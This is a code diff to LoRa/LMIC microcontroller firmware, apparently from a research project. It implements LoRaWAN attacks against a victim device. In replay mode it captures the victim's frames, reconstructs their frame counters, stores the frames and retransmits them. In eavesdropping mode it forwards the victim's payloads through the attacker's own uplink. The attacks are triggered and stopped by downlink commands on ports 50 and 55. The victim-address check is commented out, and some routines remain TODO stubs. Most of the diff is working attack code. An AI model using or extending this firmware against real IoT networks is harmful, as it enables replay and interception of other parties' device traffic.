@@ -146,25 +146,37 @@ void setdevAddr() {
 }
 
 void setFcnt() {
-    // for inferring
-    //uint16_t plusCounter = 0xFFFF;
 
-    uint32_t receivedFCnt = rxBuffer[2] + rxBuffer[3] * 256;
+    uint16_t receivedFCnt = rxBuffer[2] + rxBuffer[3] * 256;
+    
+    if(maxFcnt == 0xFFFF) 
+    {
+        fcnt = receivedFCnt;
+    }
+    else 
+    {
+        uint16_t fcntHigh = fcnt >> 16;
+        uint16_t fcntLow = fcnt & 0xFFFF;
 
-    // if(fcnt == 0) {
-    //     fcnt = receivedFCnt;
-    // } 
-    // TODO 
-    // else if(fcnt < receivedFCnt) {
-        
-    // } else if(fcnt > receivedFCnt) {
-        
-    // }
-
-    fcnt = receivedFCnt;
-
+        // uninitialised fcnt set to value
+        if(fcnt == 0) 
+        {
+            fcnt = receivedFCnt;
+        }
+        // if received is bigger than lower byte, just add it to higher byte 
+        else if(receivedFCnt > fcntLow) 
+        {
+            fcnt = (fcntHigh << 16) + receivedFCnt;
+        }
+        // if received is smaller than lower byte, then add +1 to higher byte (just like Network Server does)
+        else if(receivedFCnt < fcntLow) 
+        {
+            fcnt = ((fcntHigh + 1) << 16) + receivedFCnt;
+        }
+    }
+    
     Serial.print("FCnt: ");
-    Serial.print(receivedFCnt);
+    Serial.print(fcnt);
     Serial.println("");
 }
 
@@ -177,17 +189,42 @@ void printData() {
     Serial.println("\n");
 }
 
+bool receiveLoRaFrame() {
+    rxRecvLen = sizeof(rxBuffer);
+
+    if (rf95.available())
+        return rf95.recv(rxBuffer, &rxRecvLen);
+
+    return false;
+}
+
 bool frameBelongsToVictim() {
 
     setdevAddr();
 
-    // todo compare to victimAddr
+    // for(int i=0; i<4; i++) 
+    //     if(devAddr[i] != victimAddress[i]) 
+    //         return false;
+    
     return true;
 }
 
 void storeFrame() {
-    //todo actually push to vector
-    //receivedFrames.push_back();
+    // frame to store all info
+    std::vector<uint8_t> frame;
+
+    //check if this correct
+    frame.push_back(rf95.headerTo());
+
+    // like a reverse of setDevAddr
+    frame.push_back(rf95.headerFrom());
+    frame.push_back(rf95.headerId());
+    frame.push_back(rf95.headerFlags());
+    for(int i=0; i<rxRecvLen; i++) {
+        frame.push_back(rxBuffer[i]);
+    }
+    
+    receivedFrames.push_back(frame);
 
     lastFcnt = fcnt;
 
@@ -197,40 +234,71 @@ void storeFrame() {
 }
 
 void replayFrame() {
+    std::vector<uint8_t> frame = receivedFrames[0];
 
+    rf95.setHeaderTo(frame[0]);
+    rf95.setHeaderFrom(frame[1]);
+    rf95.setHeaderId(frame[2]);
+    rf95.setHeaderFlags(frame[3]);
+    rf95.send(&frame[4], frame.size() - 4);
 }
 
-void replayAttackFinish() {
-    attackMode = None;
+std::vector<AttackMode> attacks;
+
+
+// finish current attack and proceed to next one
+void attackFinish() {
+
+    if(attacks.size() > 0) {
+        attackMode = attacks[attacks.size() - 1];
+        attacks.pop_back();
+    }
+    else {
+        attackMode = None;
+    }
+
+    fcnt = 0;
 }
 
 void replayAttackRoutine() {
 
-    rxRecvLen = sizeof(rxBuffer);
+    if(receiveLoRaFrame())
+    {           
+        if(frameBelongsToVictim()) 
+        {
+            setFcnt();
+            printData();
 
-    if (rf95.available())
-    { 
-        // recieve LoRa frame
-        if (rf95.recv(rxBuffer, &rxRecvLen))
-        {           
-            if(frameBelongsToVictim()) 
-            {
-                setFcnt();
-                printData();
-
-                if(fcnt >= lastFcnt + gap || fcnt == maxFcnt) {
-                    storeFrame();
-                } else if(receivedFrames.size() > 0 && fcnt + gap <firstFcnt) {
-                    replayFrame();
-                    replayAttackFinish();
-                }
+            if(fcnt >= lastFcnt + gap || fcnt == maxFcnt) {
+                storeFrame();
+            } else if(receivedFrames.size() > 0 && fcnt + gap <firstFcnt) {
+                replayFrame();
+                attackFinish();
             }
         }
     }
 }
 
-void eavesdroppingRoutine() {
+bool frameIsAttackTerminationSignal() {
+    // TODO idk if this needs to be implemented or processDownlink is enough to call attackFinish
+    return false;
+}
 
+void sendVictimFrame() {
+    LMIC_setSeqnoUp(fcnt);
+    const int dataStart = 4;
+    scheduleUplink(10,rxBuffer + dataStart, rxRecvLen -dataStart);
+}
+
+void eavesdroppingRoutine() {
+    if(receiveLoRaFrame()) {
+        if(frameBelongsToVictim()) {
+            sendVictimFrame();
+        }
+        else if(frameIsAttackTerminationSignal()) {
+            attackFinish();
+        }
+    }
 }
 
 //  █ █ █▀▀ █▀▀ █▀▄   █▀▀ █▀█ █▀▄ █▀▀   █▀▄ █▀▀ █▀▀ ▀█▀ █▀█
@@ -955,7 +1023,21 @@ void processWork(ostime_t doWorkJobTimeStamp)
             // scheduleUplink(fPort, payloadBuffer, payloadLength);
         }
     }
-}    
+}  
+
+
+// bits in byte indicate which attacks to perform, first bit is ReplayAttack, second Eavesdropping
+void setAttacks(uint8_t attacksByte) {
+
+    attacks.clear();
+
+    if(attacksByte & 1) {
+        attacks.push_back(ReplayAttack);
+    }
+    if(attacksByte & 2) {
+        attacks.push_back(Eavesdropping);
+    }
+}
  
 
 void processDownlink(ostime_t txCompleteTimestamp, uint8_t fPort, uint8_t* data, uint8_t dataLength)
@@ -980,6 +1062,46 @@ void processDownlink(ostime_t txCompleteTimestamp, uint8_t fPort, uint8_t* data,
         resetCounter();
         printEvent(timestamp, "Counter reset", PrintTarget::All, false);
     }          
+
+    // if message is received on attack port 50 it indicates attack start
+    const uint8_t attackPort = 50;
+
+    if(fPort == attackPort && dataLength > 4) {
+        victimAddress[0] = data[0];
+        victimAddress[1] = data[1];
+        victimAddress[2] = data[2];
+        victimAddress[3] = data[3];
+
+        // set attacks
+        setAttacks(data[4]);
+
+        // set maxFcnt
+        if(dataLength > 6) {
+            if(data[5] == 1) {
+                maxFcnt = 0xFFFFFFFF;
+            }else{
+                maxFcnt = 0xFFFF;
+            }
+        }
+
+        // set gap parameter for Replay Attack
+        if(dataLength > 7) {
+            gap = data[6] * 256 + data[7];
+        }
+
+        Serial.println("Attacks started: ");
+        printBytes(data, dataLength);
+    }
+
+    // port 55 indicates attack finish
+    const uint8_t attackTerminationPort = 55;
+
+    if(fPort == attackTerminationPort) {
+        attackFinish();
+        Serial.print("Attack Finished, next is: ");
+        Serial.println(attackMode);
+    }
+
 }
 
 
